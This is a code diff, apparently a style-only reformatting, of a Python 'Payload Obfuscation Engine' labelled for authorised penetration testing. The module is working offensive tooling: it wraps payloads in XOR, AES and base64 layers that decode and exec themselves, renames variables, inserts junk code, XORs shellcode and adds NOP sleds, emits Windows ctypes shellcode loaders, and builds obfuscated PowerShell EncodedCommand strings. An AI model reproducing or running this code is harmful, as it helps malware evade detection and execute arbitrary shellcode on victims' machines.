@@ -5,34 +5,37 @@ Payload 混淆模块 - Payload Obfuscation Engine
 仅用于授权渗透测试
 """
 
+import ast
 import base64
+import hashlib
+import os
 import random
+import re
 import secrets
 import string
 import zlib
-import hashlib
-import re
-import ast
-import os
-from typing import Dict, List, Optional, Tuple, Any, Callable
+from abc import ABC, abstractmethod
 from dataclasses import dataclass, field
 from enum import Enum
-from abc import ABC, abstractmethod
+from typing import Any, Callable, Dict, List, Optional, Tuple
 
 # 尝试导入加密库
 try:
     from Crypto.Cipher import AES
     from Crypto.Util.Padding import pad, unpad
+
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
 
 import logging
+
 logger = logging.getLogger(__name__)
 
 
 class EncodingType(Enum):
     """编码类型"""
+
     BASE64 = "base64"
     BASE32 = "base32"
     HEX = "hex"
@@ -45,6 +48,7 @@ class EncodingType(Enum):
 
 class ObfuscationType(Enum):
     """混淆类型"""
+
     VARIABLE_RENAME = "var_rename"
     STRING_ENCODE = "string_encode"
     CODE_FLOW = "code_flow"
@@ -56,6 +60,7 @@ class ObfuscationType(Enum):
 @dataclass
 class ObfuscationConfig:
     """混淆配置"""
+
     encoding: EncodingType = EncodingType.XOR
     xor_key: str = ""
     aes_key: str = ""
@@ -69,6 +74,7 @@ class ObfuscationConfig:
 @dataclass
 class ObfuscationResult:
     """混淆结果"""
+
     success: bool
     original_size: int
     obfuscated_size: int
@@ -105,24 +111,21 @@ class XOREncoder(BaseEncoder):
     def _generate_key(self, length: int = 16) -> str:
         """生成密码学安全的随机密钥"""
         charset = string.ascii_letters + string.digits
-        return ''.join(secrets.choice(charset) for _ in range(length))
+        return "".join(secrets.choice(charset) for _ in range(length))
 
     def encode(self, data: bytes) -> bytes:
         key_bytes = self.key.encode()
-        return bytes([
-            b ^ key_bytes[i % len(key_bytes)]
-            for i, b in enumerate(data)
-        ])
+        return bytes([b ^ key_bytes[i % len(key_bytes)] for i, b in enumerate(data)])
 
     def decode(self, data: bytes) -> bytes:
         return self.encode(data)  # XOR is symmetric
 
     def get_decoder_code(self, var_name: str = "data") -> str:
-        return f'''
+        return f"""
 def _xd({var_name}, k):
     kb = k.encode()
     return bytes([b ^ kb[i % len(kb)] for i, b in enumerate({var_name})])
-'''
+"""
 
 
 class AESEncoder(BaseEncoder):
@@ -137,7 +140,7 @@ class AESEncoder(BaseEncoder):
     def _generate_key(self, length: int = 32) -> str:
         """生成密码学安全的随机密钥"""
         charset = string.ascii_letters + string.digits
-        return ''.join(secrets.choice(charset) for _ in range(length))
+        return "".join(secrets.choice(charset) for _ in range(length))
 
     def encode(self, data: bytes) -> bytes:
         iv = os.urandom(16)
@@ -152,7 +155,7 @@ class AESEncoder(BaseEncoder):
         return unpad(cipher.decrypt(encrypted), AES.block_size)
 
     def get_decoder_code(self, var_name: str = "data") -> str:
-        return f'''
+        return f"""
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 import hashlib
@@ -162,7 +165,7 @@ def _ad({var_name}, k):
     iv, enc = {var_name}[:16], {var_name}[16:]
     c = AES.new(kb, AES.MODE_CBC, iv)
     return unpad(c.decrypt(enc), 16)
-'''
+"""
 
 
 class Base64Encoder(BaseEncoder):
@@ -225,7 +228,7 @@ class ROT13Encoder(BaseEncoder):
         return self._rot13(data)
 
     def get_decoder_code(self, var_name: str = "data") -> str:
-        return f'''
+        return f"""
 def _r13(d):
     r = []
     for b in d:
@@ -237,22 +240,22 @@ def _r13(d):
             r.append(b)
     return bytes(r)
 {var_name} = _r13({var_name})
-'''
+"""
 
 
 class UnicodeEncoder(BaseEncoder):
     """Unicode 编码器"""
 
     def encode(self, data: bytes) -> bytes:
-        return ''.join([f'\\u{b:04x}' for b in data]).encode()
+        return "".join([f"\\u{b:04x}" for b in data]).encode()
 
     def decode(self, data: bytes) -> bytes:
         text = data.decode()
         result = []
         i = 0
         while i < len(text):
-            if text[i:i+2] == '\\u' and i + 6 <= len(text):
-                result.append(int(text[i+2:i+6], 16))
+            if text[i : i + 2] == "\\u" and i + 6 <= len(text):
+                result.append(int(text[i + 2 : i + 6], 16))
                 i += 6
             else:
                 result.append(ord(text[i]))
@@ -260,7 +263,7 @@ class UnicodeEncoder(BaseEncoder):
         return bytes(result)
 
     def get_decoder_code(self, var_name: str = "data") -> str:
-        return f'''
+        return f"""
 def _ud(d):
     t, r, i = d.decode(), [], 0
     while i < len(t):
@@ -270,7 +273,7 @@ def _ud(d):
             r.append(ord(t[i])); i += 1
     return bytes(r)
 {var_name} = _ud({var_name})
-'''
+"""
 
 
 class PayloadObfuscator:
@@ -308,9 +311,7 @@ class PayloadObfuscator:
 
         self._var_counter = 0
 
-    def _get_encoder(self,
-                     encoding: EncodingType,
-                     key: str = "") -> BaseEncoder:
+    def _get_encoder(self, encoding: EncodingType, key: str = "") -> BaseEncoder:
         """获取编码器实例"""
         encoder_class = self._encoders.get(encoding)
         if not encoder_class:
@@ -323,15 +324,17 @@ class PayloadObfuscator:
     def _generate_var_name(self) -> str:
         """生成随机变量名"""
         self._var_counter += 1
-        prefix = secrets.choice(['_', '__', '___'])
-        chars = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))
+        prefix = secrets.choice(["_", "__", "___"])
+        chars = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
         return f"{prefix}{chars}{self._var_counter}"
 
-    def obfuscate(self,
-                  payload: str,
-                  encoding: EncodingType = EncodingType.XOR,
-                  key: str = "",
-                  add_decoder: bool = True) -> ObfuscationResult:
+    def obfuscate(
+        self,
+        payload: str,
+        encoding: EncodingType = EncodingType.XOR,
+        key: str = "",
+        add_decoder: bool = True,
+    ) -> ObfuscationResult:
         """
         混淆 Payload
 
@@ -343,7 +346,7 @@ class PayloadObfuscator:
         """
         try:
             encoder = self._get_encoder(encoding, key)
-            payload_bytes = payload.encode('utf-8')
+            payload_bytes = payload.encode("utf-8")
 
             # 编码
             encoded = encoder.encode(payload_bytes)
@@ -355,59 +358,58 @@ class PayloadObfuscator:
 
                 if encoding == EncodingType.XOR:
                     encoded_b64 = base64.b64encode(encoded).decode()
-                    decoder_code = f'''
+                    decoder_code = f"""
 import base64
 {var_name} = base64.b64decode("{encoded_b64}")
 {encoder.get_decoder_code(var_name)}
 {var_name} = _xd({var_name}, "{encoder.key}")
 exec({var_name}.decode())
-'''
+"""
                 elif encoding == EncodingType.AES:
                     encoded_b64 = base64.b64encode(encoded).decode()
-                    decoder_code = f'''
+                    decoder_code = f"""
 import base64
 {var_name} = base64.b64decode("{encoded_b64}")
 {encoder.get_decoder_code(var_name)}
 {var_name} = _ad({var_name}, "{encoder.key}")
 exec({var_name}.decode())
-'''
+"""
                 elif encoding == EncodingType.BASE64:
-                    decoder_code = f'''
+                    decoder_code = f"""
 import base64
 {var_name} = base64.b64decode("{encoded.decode()}")
 exec({var_name}.decode())
-'''
+"""
                 else:
                     # 通用模式
                     encoded_repr = repr(encoded)
-                    decoder_code = f'''
+                    decoder_code = f"""
 {var_name} = {encoded_repr}
 {encoder.get_decoder_code(var_name)}
 exec({var_name}.decode())
-'''
+"""
 
             return ObfuscationResult(
                 success=True,
                 original_size=len(payload),
                 obfuscated_size=len(decoder_code) if decoder_code else len(encoded),
-                payload=decoder_code if decoder_code else encoded.decode(errors='ignore'),
+                payload=decoder_code if decoder_code else encoded.decode(errors="ignore"),
                 decoder=decoder_code,
-                key=getattr(encoder, 'key', ''),
-                encoding=encoding.value
+                key=getattr(encoder, "key", ""),
+                encoding=encoding.value,
             )
 
         except Exception as e:
             return ObfuscationResult(
-                success=False,
-                original_size=len(payload),
-                obfuscated_size=0,
-                payload=f"Error: {e}"
+                success=False, original_size=len(payload), obfuscated_size=0, payload=f"Error: {e}"
             )
 
-    def obfuscate_multilayer(self,
-                             payload: str,
-                             encodings: List[EncodingType] = None,
-                             keys: Dict[EncodingType, str] = None) -> ObfuscationResult:
+    def obfuscate_multilayer(
+        self,
+        payload: str,
+        encodings: List[EncodingType] = None,
+        keys: Dict[EncodingType, str] = None,
+    ) -> ObfuscationResult:
         """
         多层混淆
 
@@ -420,7 +422,7 @@ exec({var_name}.decode())
         keys = keys or {}
 
         try:
-            current_data = payload.encode('utf-8')
+            current_data = payload.encode("utf-8")
             encoder_instances = []
 
             # 依次应用各层编码
@@ -434,23 +436,16 @@ exec({var_name}.decode())
             var_name = self._generate_var_name()
             encoded_b64 = base64.b64encode(current_data).decode()
 
-            decoder_parts = [
-                "import base64",
-                f'{var_name} = base64.b64decode("{encoded_b64}")'
-            ]
+            decoder_parts = ["import base64", f'{var_name} = base64.b64decode("{encoded_b64}")']
 
             # 逆序添加解码步骤
             for encoding, encoder in reversed(encoder_instances):
                 if encoding == EncodingType.XOR:
                     decoder_parts.append(encoder.get_decoder_code(var_name))
-                    decoder_parts.append(
-                        f'{var_name} = _xd({var_name}, "{encoder.key}")'
-                    )
+                    decoder_parts.append(f'{var_name} = _xd({var_name}, "{encoder.key}")')
                 elif encoding == EncodingType.AES:
                     decoder_parts.append(encoder.get_decoder_code(var_name))
-                    decoder_parts.append(
-                        f'{var_name} = _ad({var_name}, "{encoder.key}")'
-                    )
+                    decoder_parts.append(f'{var_name} = _ad({var_name}, "{encoder.key}")')
                 elif encoding == EncodingType.BASE64:
                     decoder_parts.append(
                         f"import base64; {var_name} = base64.b64decode({var_name})"
@@ -460,9 +455,7 @@ exec({var_name}.decode())
                         f"import base64; {var_name} = base64.b32decode({var_name})"
                     )
                 elif encoding == EncodingType.HEX:
-                    decoder_parts.append(
-                        f"{var_name} = bytes.fromhex({var_name}.decode())"
-                    )
+                    decoder_parts.append(f"{var_name} = bytes.fromhex({var_name}.decode())")
 
             decoder_parts.append(f"exec({var_name}.decode())")
             decoder_code = "\n".join(decoder_parts)
@@ -474,7 +467,7 @@ exec({var_name}.decode())
                 payload=decoder_code,
                 decoder=decoder_code,
                 encoding=",".join([e.value for e in encodings]),
-                layers=len(encodings)
+                layers=len(encodings),
             )
 
         except Exception as e:
@@ -483,7 +476,7 @@ exec({var_name}.decode())
                 original_size=len(payload),
                 obfuscated_size=0,
                 payload=f"Error: {e}",
-                layers=0
+                layers=0,
             )
 
 
@@ -499,7 +492,7 @@ class VariableObfuscator:
         """生成混淆变量名"""
         self._counter += 1
         name_len = secrets.randbelow(5) + 4  # 4-8
-        chars = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(name_len))
+        chars = "".join(secrets.choice(string.ascii_lowercase) for _ in range(name_len))
         return f"{self.prefix}{chars}{self._counter}"
 
     def obfuscate_code(self, code: str) -> Tuple[str, Dict[str, str]]:
@@ -525,8 +518,10 @@ class VariableObfuscator:
                     user_vars.add(arg.arg)
 
         # 排除内置名称
-        builtins = set(dir(__builtins__)) if isinstance(__builtins__, dict) else set(dir(__builtins__))
-        builtins.update(['print', 'exec', 'eval', 'open', 'import', 'from', 'as'])
+        builtins = (
+            set(dir(__builtins__)) if isinstance(__builtins__, dict) else set(dir(__builtins__))
+        )
+        builtins.update(["print", "exec", "eval", "open", "import", "from", "as"])
         user_vars -= builtins
 
         # 创建映射
@@ -537,15 +532,10 @@ class VariableObfuscator:
         # 替换变量名
         result = code
         for original, obfuscated in sorted(
-            self._mapping.items(),
-            key=lambda x: -len(x[0])  # 先替换长名称
+            self._mapping.items(), key=lambda x: -len(x[0])  # 先替换长名称
         ):
             # 使用词边界替换
-            result = re.sub(
-                rf'\b{re.escape(original)}\b',
-                obfuscated,
-                result
-            )
+            result = re.sub(rf"\b{re.escape(original)}\b", obfuscated, result)
 
         return result, self._mapping.copy()
 
@@ -570,7 +560,7 @@ class CodeTransformer:
             "[{val} for _ in []]",
         ]
 
-        lines = code.split('\n')
+        lines = code.split("\n")
         result_lines = []
 
         for line in lines:
@@ -578,18 +568,18 @@ class CodeTransformer:
 
             # 按比例插入垃圾代码
             if secrets.randbelow(100) < int(ratio * 100) and line.strip():
-                var = ''.join(secrets.choice(string.ascii_lowercase) for _ in range(4))
+                var = "".join(secrets.choice(string.ascii_lowercase) for _ in range(4))
                 val = secrets.randbelow(10000)
                 template = secrets.choice(junk_templates)
                 junk = template.format(var=var, val=val)
                 result_lines.append(junk)
 
-        return '\n'.join(result_lines)
+        return "\n".join(result_lines)
 
     @staticmethod
     def string_to_chr_concat(s: str) -> str:
         """将字符串转为 chr() 拼接"""
-        return '+'.join([f'chr({ord(c)})' for c in s])
+        return "+".join([f"chr({ord(c)})" for c in s])
 
     @staticmethod
     def string_to_hex_decode(s: str) -> str:
@@ -609,7 +599,7 @@ class CodeTransformer:
 
             # 短字符串用 chr() 拼接
             if len(content) < 20:
-                return f'({CodeTransformer.string_to_chr_concat(content)})'
+                return f"({CodeTransformer.string_to_chr_concat(content)})"
             else:
                 # 长字符串用 hex 解码
                 return CodeTransformer.string_to_hex_decode(content)
@@ -621,10 +611,10 @@ class CodeTransformer:
         """压缩并编码代码"""
         compressed = zlib.compress(code.encode())
         b64 = base64.b64encode(compressed).decode()
-        return f'''
+        return f"""
 import zlib,base64
 exec(zlib.decompress(base64.b64decode("{b64}")))
-'''
+"""
 
 
 class ShellcodeObfuscator:
@@ -636,17 +626,14 @@ class ShellcodeObfuscator:
         if key is None:
             key = os.urandom(len(shellcode) if len(shellcode) < 32 else 32)
 
-        obfuscated = bytes([
-            shellcode[i] ^ key[i % len(key)]
-            for i in range(len(shellcode))
-        ])
+        obfuscated = bytes([shellcode[i] ^ key[i % len(key)] for i in range(len(shellcode))])
 
         return obfuscated, key
 
     @staticmethod
     def add_nop_sled(shellcode: bytes, length: int = 16) -> bytes:
         """添加 NOP Sled"""
-        nop = b'\x90' * length
+        nop = b"\x90" * length
         return nop + shellcode
 
     @staticmethod
@@ -656,11 +643,11 @@ class ShellcodeObfuscator:
         注: 需要确保垃圾指令不影响执行流
         """
         garbage_opcodes = [
-            b'\x90',           # NOP
-            b'\x50\x58',       # PUSH EAX; POP EAX
-            b'\x53\x5b',       # PUSH EBX; POP EBX
-            b'\x89\xc0',       # MOV EAX, EAX
-            b'\x31\xc9\x31\xc9',  # XOR ECX,ECX twice
+            b"\x90",  # NOP
+            b"\x50\x58",  # PUSH EAX; POP EAX
+            b"\x53\x5b",  # PUSH EBX; POP EBX
+            b"\x89\xc0",  # MOV EAX, EAX
+            b"\x31\xc9\x31\xc9",  # XOR ECX,ECX twice
         ]
 
         result = bytearray()
@@ -672,15 +659,14 @@ class ShellcodeObfuscator:
         return bytes(result)
 
     @staticmethod
-    def to_python_loader(shellcode: bytes,
-                         xor_key: bytes = None) -> str:
+    def to_python_loader(shellcode: bytes, xor_key: bytes = None) -> str:
         """生成 Python Shellcode 加载器"""
         if xor_key:
             shellcode, _ = ShellcodeObfuscator.xor_shellcode(shellcode, xor_key)
             key_b64 = base64.b64encode(xor_key).decode()
             sc_b64 = base64.b64encode(shellcode).decode()
 
-            return f'''
+            return f"""
 import ctypes, base64
 
 k = base64.b64decode("{key_b64}")
@@ -701,10 +687,10 @@ ht = ctypes.windll.kernel32.CreateThread(
     ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
 )
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
-'''
+"""
         else:
             sc_b64 = base64.b64encode(shellcode).decode()
-            return f'''
+            return f"""
 import ctypes, base64
 
 sc = base64.b64decode("{sc_b64}")
@@ -722,7 +708,7 @@ ht = ctypes.windll.kernel32.CreateThread(
     ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0))
 )
 ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
-'''
+"""
 
 
 class PowerShellObfuscator:
@@ -731,8 +717,8 @@ class PowerShellObfuscator:
     @staticmethod
     def base64_encode(script: str) -> str:
         """Base64 编码 PowerShell 脚本"""
-        encoded = base64.b64encode(script.encode('utf-16-le')).decode()
-        return f'powershell -EncodedCommand {encoded}'
+        encoded = base64.b64encode(script.encode("utf-16-le")).decode()
+        return f"powershell -EncodedCommand {encoded}"
 
     @staticmethod
     def string_concat(s: str) -> str:
@@ -747,7 +733,7 @@ class PowerShellObfuscator:
             parts.append(f"'{s[i:i+chunk_len]}'")
             i += chunk_len
 
-        return '(' + '+'.join(parts) + ')'
+        return "(" + "+".join(parts) + ")"
 
     @staticmethod
     def tick_obfuscation(s: str) -> str:
@@ -755,18 +741,18 @@ class PowerShellObfuscator:
         result = []
         for c in s:
             if c.isalpha() and random.random() < 0.5:
-                result.append(f'`{c}')
+                result.append(f"`{c}")
             else:
                 result.append(c)
-        return ''.join(result)
+        return "".join(result)
 
     @staticmethod
     def variable_rename(script: str) -> str:
         """变量名混淆"""
         # 简化实现：替换常见变量
         replacements = {
-            '$_': f'${secrets.choice(string.ascii_lowercase)}',
-            '$args': f'${secrets.choice(string.ascii_lowercase)}rgs',
+            "$_": f"${secrets.choice(string.ascii_lowercase)}",
+            "$args": f"${secrets.choice(string.ascii_lowercase)}rgs",
         }
 
         for old, new in replacements.items():
@@ -776,10 +762,9 @@ class PowerShellObfuscator:
 
 
 # 便捷函数
-def obfuscate_payload(payload: str,
-                      encoding: str = "xor",
-                      key: str = "",
-                      multilayer: bool = False) -> Dict[str, Any]:
+def obfuscate_payload(
+    payload: str, encoding: str = "xor", key: str = "", multilayer: bool = False
+) -> Dict[str, Any]:
     """
     混淆 Payload
 
@@ -795,42 +780,41 @@ def obfuscate_payload(payload: str,
     obfuscator = PayloadObfuscator()
 
     encoding_map = {
-        'xor': EncodingType.XOR,
-        'aes': EncodingType.AES,
-        'base64': EncodingType.BASE64,
-        'base32': EncodingType.BASE32,
-        'hex': EncodingType.HEX,
-        'rot13': EncodingType.ROT13,
-        'unicode': EncodingType.UNICODE,
+        "xor": EncodingType.XOR,
+        "aes": EncodingType.AES,
+        "base64": EncodingType.BASE64,
+        "base32": EncodingType.BASE32,
+        "hex": EncodingType.HEX,
+        "rot13": EncodingType.ROT13,
+        "unicode": EncodingType.UNICODE,
     }
 
     enc_type = encoding_map.get(encoding.lower(), EncodingType.XOR)
 
     if multilayer:
-        result = obfuscator.obfuscate_multilayer(
-            payload,
-            encodings=[enc_type, EncodingType.BASE64]
-        )
+        result = obfuscator.obfuscate_multilayer(payload, encodings=[enc_type, EncodingType.BASE64])
     else:
         result = obfuscator.obfuscate(payload, enc_type, key)
 
     return {
-        'success': result.success,
-        'payload': result.payload,
-        'decoder': result.decoder,
-        'key': result.key,
-        'encoding': result.encoding,
-        'original_size': result.original_size,
-        'obfuscated_size': result.obfuscated_size,
-        'layers': result.layers
+        "success": result.success,
+        "payload": result.payload,
+        "decoder": result.decoder,
+        "key": result.key,
+        "encoding": result.encoding,
+        "original_size": result.original_size,
+        "obfuscated_size": result.obfuscated_size,
+        "layers": result.layers,
     }
 
 
-def obfuscate_python_code(code: str,
-                          rename_vars: bool = True,
-                          add_junk: bool = True,
-                          obfuscate_strings: bool = True,
-                          compress: bool = False) -> Dict[str, Any]:
+def obfuscate_python_code(
+    code: str,
+    rename_vars: bool = True,
+    add_junk: bool = True,
+    obfuscate_strings: bool = True,
+    compress: bool = False,
+) -> Dict[str, Any]:
     """
     混淆 Python 代码
 
@@ -862,24 +846,20 @@ def obfuscate_python_code(code: str,
             result_code = CodeTransformer.compress_code(result_code)
 
         return {
-            'success': True,
-            'code': result_code,
-            'mapping': var_mapping,
-            'original_size': len(code),
-            'obfuscated_size': len(result_code)
+            "success": True,
+            "code": result_code,
+            "mapping": var_mapping,
+            "original_size": len(code),
+            "obfuscated_size": len(result_code),
         }
 
     except Exception as e:
-        return {
-            'success': False,
-            'code': code,
-            'error': str(e)
-        }
+        return {"success": False, "code": code, "error": str(e)}
 
 
-def generate_shellcode_loader(shellcode_hex: str,
-                              xor_encrypt: bool = True,
-                              platform: str = "windows") -> Dict[str, Any]:
+def generate_shellcode_loader(
+    shellcode_hex: str, xor_encrypt: bool = True, platform: str = "windows"
+) -> Dict[str, Any]:
     """
     生成 Shellcode 加载器
 
@@ -892,7 +872,7 @@ def generate_shellcode_loader(shellcode_hex: str,
         {success, loader, key}
     """
     try:
-        shellcode = bytes.fromhex(shellcode_hex.replace('\\x', '').replace(' ', ''))
+        shellcode = bytes.fromhex(shellcode_hex.replace("\\x", "").replace(" ", ""))
 
         key = None
         if xor_encrypt:
@@ -912,23 +892,19 @@ ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_char.from_buffer(mem
 """
 
         return {
-            'success': True,
-            'loader': loader,
-            'key': key.hex() if key else None,
-            'platform': platform
+            "success": True,
+            "loader": loader,
+            "key": key.hex() if key else None,
+            "platform": platform,
         }
 
     except Exception as e:
-        return {
-            'success': False,
-            'loader': '',
-            'error': str(e)
-        }
+        return {"success": False, "loader": "", "error": str(e)}
 
 
 if __name__ == "__main__":
     # 配置测试用日志
-    logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')
+    logging.basicConfig(level=logging.INFO, format="%(levelname)s: %(message)s")
 
     logger.info("Payload Obfuscation Module")
     logger.info("=" * 50)
